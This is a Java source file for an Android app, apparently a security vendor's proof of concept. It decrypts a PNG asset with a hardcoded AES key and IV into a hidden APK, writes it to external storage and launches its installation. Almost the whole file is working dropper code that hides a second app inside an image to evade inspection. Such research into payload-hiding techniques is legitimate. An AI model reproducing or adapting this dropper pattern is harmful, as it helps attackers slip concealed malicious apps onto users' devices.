package com.fortiguard.poc.angecrypt;

import android.widget.TextView;
import android.widget.Button;
import android.view.View;
import android.app.Activity;
import android.os.Bundle;
import android.content.res.AssetManager;
import java.io.*;
import android.content.Intent; 
import android.net.Uri;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.spec.IvParameterSpec;
import android.widget.Toast;
import android.util.Log;
import android.content.Context;
import android.os.Environment;
import android.widget.ImageView;
import android.graphics.drawable.Drawable;

public class PocActivity extends Activity
{
    public TextView txtView = null;
    public ImageView mImage = null;

    // full path name for decrypted APK: e.g /storage/sdcard/hidden.apk
    public static final String PAYLOAD_APK = Environment.getExternalStorageDirectory() + "/hidden.apk";

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState)    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

	txtView = (TextView) findViewById(R.id.txtView);
	Button goBtn = (Button) findViewById(R.id.goBtn);
	mImage = (ImageView)findViewById(R.id.image);

	// display the png
	try {
	    InputStream ims = getAssets().open("anakin.png");
	    Drawable d = Drawable.createFromStream(ims, null);
	    mImage.setImageDrawable(d);
	    Log.i("PoC", "Image displayed");
	}
	catch(IOException exp) {
	    Log.e("PoC", "Image display exception caught: "+exp.toString());
	    exp.printStackTrace();
	    txtView.setText("An error occurred :(");
	}

	// do the job when the GO button is pressed
	goBtn.setOnClickListener(new View.OnClickListener()         {
            public void onClick(View v)             {                
		try {
		    Log.i("PoC", "reading asset...");
		    byte [] png = readAsset("anakin.png");

		    // decrypting
		    String key = "Anakin= DarkSide";
		    byte [] iv = { (byte) 0xd3,(byte) 0x9e,(byte) 0xc,(byte) 0xef,
				   (byte) 0x23,(byte) 0x70,(byte) 0x2a,(byte) 0xa3,
				   (byte) 0xe9,(byte) 0x8a,(byte) 0xcc,(byte) 0x3a,
				   (byte) 0x2b,(byte) 0xf0,(byte) 0x1a,(byte) 0xec };


		    Log.i("PoC", "decrypting asset...");
		    byte [] decrypted = decrypt(key.getBytes(), iv, png);

		    // dumping the decrypted asset
		    Log.i("PoC", "writing decrypted asset to: "+PocActivity.PAYLOAD_APK);
		    writeFile(decrypted, PocActivity.PAYLOAD_APK);

		    // installing it
		    Log.i("PoC", "installing apk...");
		    installApk(PocActivity.PAYLOAD_APK);

		    Log.i("PoC", "done");
		    txtView.setText("The hidden APK has been installed!");
		}
		catch(Exception exp) {
		    Log.e("PoC", "Exception caught: "+exp.toString());
		    exp.printStackTrace();
		    txtView.setText("An error occurred :(");
		}
            }
        });
    }

    public byte [] readAsset(String filename) throws IOException {
	AssetManager assetmanager = getAssets();
	InputStream in = assetmanager.open(filename);
	int size = in.available();
	byte[] buffer = new byte[size];
	in.read(buffer);
	in.close();
	return buffer;
    }

    public void writeFile(byte [] array, String filename) throws Exception {
	File myFile = new File(filename);
	myFile.createNewFile();
	FileOutputStream fout = new FileOutputStream(myFile);
	fout.write(array, 0, array.length);
	fout.close();
    }

    public void installApk(String filename) {
	Intent intent =new Intent(Intent.ACTION_VIEW);
	Log.i("PoC", "File: "+filename);
	//	intent.setClassName("com.fortiguard.hidestr", "com.fortiguard.hidestr.HideString"); 
	intent.setDataAndType(Uri.fromFile(new File(filename)), "application/vnd.android.package-archive");
	//	intent.setPackage("com.fortiguard.hidestr");
	intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	Log.i("PoC", "Intent is: "+intent.toString()); 
	startActivity(intent);
    }

    private static byte[] decrypt(byte[] keyBytes, 
				  byte [] iv, 
				  byte[] ciphertext) throws Exception {
	IvParameterSpec ivspec = new IvParameterSpec(iv);
	SecretKeySpec sk = new SecretKeySpec(keyBytes, "AES");
	Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
	cipher.init(Cipher.DECRYPT_MODE, sk, ivspec);
	byte[] decrypted = cipher.doFinal(ciphertext);
	return decrypted;
    }

}
